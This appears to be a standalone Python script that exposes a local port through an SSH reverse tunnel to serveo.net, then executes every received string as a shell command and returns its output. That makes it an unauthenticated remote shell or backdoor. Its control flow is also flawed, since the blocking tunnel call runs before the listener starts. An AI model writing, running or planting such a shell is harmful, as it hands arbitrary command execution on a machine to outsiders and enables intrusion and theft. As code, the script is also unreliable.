import os
import subprocess
import socket

PORT = 8000

def main():
    try:
        os.system(f'ssh -R {PORT}:localhost:{PORT} serveo.net')
    except KeyboardInterrupt:
        pass

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('localhost', PORT))
        s.listen()
        print(f'Server listening on localhost:{PORT}')
        conn, addr = s.accept()
        with conn:
            print(f'Connected by {addr}')
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                output = subprocess.check_output(data.decode(), shell=True)
                conn.sendall(output)

if __name__ == '__main__':
    main()